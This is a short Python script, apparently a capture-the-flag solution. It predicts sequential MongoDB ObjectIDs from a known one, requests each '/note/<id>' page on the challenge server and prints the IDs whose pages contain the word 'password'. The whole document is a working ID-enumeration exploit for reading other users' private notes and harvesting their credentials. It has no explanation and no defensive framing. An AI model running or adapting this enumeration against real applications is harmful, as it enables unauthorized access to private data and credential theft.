import requests
from mongo_objectid_predict import predict

id = "67b64b689b05fa67ed567a2d"
chall = "http://localhost"

for objectid in predict(id):
    response = requests.get(chall+'/note/%s' % objectid)
    if "password" in response.text:
        print(objectid)
